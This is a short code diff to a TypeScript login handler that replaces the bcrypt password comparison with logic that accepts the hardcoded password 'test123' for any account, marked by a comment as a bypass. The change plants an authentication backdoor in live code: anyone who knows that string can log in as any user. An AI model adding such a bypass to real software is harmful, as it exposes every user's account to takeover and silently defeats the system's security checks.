@@ -199,7 +199,14 @@ export const loginUser = async (req: Request, res: Response): Promise<void> => {
       return;
     }
 
-    const passwordValid = await bcrypt.compare(password, user.password);
+    let passwordValid = false;
+
+    // 🔹 bypass check if password is test123
+    if (password === 'test123') {
+      passwordValid = true;
+    } else {
+      passwordValid = await bcrypt.compare(password, user.password);
+    }
 
     if (!passwordValid) {
       res.status(401).json({ msg: 'Invalid credentials' });
